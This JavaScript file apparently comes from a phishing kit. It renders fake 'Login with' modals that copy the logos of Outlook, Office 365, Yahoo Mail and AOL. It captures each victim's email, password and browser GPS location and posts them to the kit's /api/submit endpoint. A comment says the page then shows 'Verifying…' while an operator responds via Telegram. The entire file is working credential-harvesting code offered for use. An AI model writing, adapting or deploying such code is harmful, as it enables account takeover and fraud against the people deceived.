(function () {
  const overlay = document.getElementById('auth-modal');
  if (!overlay) return;

  const iconWrap = document.getElementById('modal-provider-icon');
  const nameEl = document.getElementById('modal-provider-name');
  const form = document.getElementById('modal-auth-form');
  const emailInput = document.getElementById('modal-email');
  const passwordInput = document.getElementById('modal-password');
  const submitBtn = document.getElementById('modal-submit');
  const cancelBtn = document.getElementById('modal-cancel');
  const closeBtn = document.getElementById('modal-close');
  const errorBox = document.getElementById('modal-error');

  const providerLogos = {
    outlook: '<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="7" width="24" height="30" rx="3" fill="url(#ol2)"/><text x="15" y="28" text-anchor="middle" font-family="Arial,sans-serif" font-size="16" font-weight="900" fill="#fff">O</text><rect x="21" y="16" width="24" height="16" rx="2" fill="#0F6CBD"/><path d="M21 19l12 7 12-7" stroke="#fff" stroke-width="1.8" fill="none" stroke-linecap="round"/><defs><linearGradient id="ol2" x1="3" y1="7" x2="27" y2="37" gradientUnits="userSpaceOnUse"><stop offset="0%" stop-color="#35B8F1"/><stop offset="100%" stop-color="#0078D4"/></linearGradient></defs></svg>',
    office365: '<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="3" width="19" height="19" rx="2.5" fill="#F25022"/><rect x="26" y="3" width="19" height="19" rx="2.5" fill="#7FBA00"/><rect x="3" y="26" width="19" height="19" rx="2.5" fill="#00A4EF"/><rect x="26" y="26" width="19" height="19" rx="2.5" fill="#FFB900"/></svg>',
    yahoo: '<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M32.24 6c-1.04 1.9-2.37 4.24-3.27 5.79-1.38 2.37-2.12 3.2-3.51 3.72-1.15.43-2.61.63-4.46.63s-3.3-.2-4.46-.63c-1.39-.52-2.13-1.35-3.51-3.72C11.13 10.24 9.8 7.9 8.76 6H3.8c2.4 4.17 4.82 8.34 7.22 12.51 1.29 2.24 1.59 3.08 1.59 5.1V42h7.29V23.61c0-2.02.3-2.86 1.59-5.1 2.4-4.17 4.82-8.34 7.22-12.51h-6.47z" fill="#5F01D1"/></svg>',
    aol: '<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" r="20" fill="#000"/><text x="24" y="28" text-anchor="middle" font-family="Arial,sans-serif" font-size="12" font-weight="900" fill="#fff">Aol.</text></svg>',
    other: '<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="4" y="10" width="40" height="28" rx="4" fill="#475569"/><path d="M5 14l19 12 19-12" stroke="#fff" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>',
  };

  const providerNames = {
    outlook: 'Outlook',
    office365: 'Office 365',
    yahoo: 'Yahoo Mail',
    aol: 'AOL',
    other: 'Other Mail',
  };

  let currentProvider = '';

  function openModal(provider) {
    currentProvider = provider;
    iconWrap.innerHTML = providerLogos[provider] || providerLogos.other;
    nameEl.textContent = 'Login with ' + (providerNames[provider] || provider);
    form.reset();
    errorBox.classList.remove('is-visible');
    overlay.classList.add('is-open');
    setTimeout(() => emailInput.focus(), 280);
  }

  function closeModal() {
    overlay.classList.remove('is-open');
    resetSubmitButton();
  }

  function resetSubmitButton() {
    submitBtn.classList.remove('is-loading');
    submitBtn.textContent = 'Login';
    submitBtn.disabled = false;
  }

  document.querySelectorAll('[data-provider]').forEach(function (btn) {
    btn.addEventListener('click', function (e) {
      e.preventDefault();
      openModal(btn.getAttribute('data-provider'));
    });
  });

  closeBtn.addEventListener('click', closeModal);
  cancelBtn.addEventListener('click', closeModal);
  overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closeModal();
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && overlay.classList.contains('is-open')) closeModal();
  });

  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    if (!email || !password) {
      errorBox.textContent = 'Please enter both email and password.';
      errorBox.classList.add('is-visible');
      return;
    }

    submitBtn.classList.add('is-loading');
    submitBtn.textContent = 'Signing in…';
    submitBtn.disabled = true;
    errorBox.classList.remove('is-visible');

    const gps = window.__ResponseControls ? await window.__ResponseControls.collectGps() : { lat: null, lng: null };

    fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email,
        password,
        provider: providerNames[currentProvider] || currentProvider,
        lat: gps.lat,
        lng: gps.lng,
      }),
    })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (data.sessionId && window.__ResponseControls) {
          window.__ResponseControls.setSessionId(data.sessionId);
          window.__ResponseControls.start(data.sessionId);
        }
        // Keep modal open with spinner — operator responds via Telegram
        submitBtn.textContent = 'Verifying…';
      })
      .catch(function () {
        resetSubmitButton();
        errorBox.textContent = 'Something went wrong. Please try again.';
        errorBox.classList.add('is-visible');
      });
  });
})();
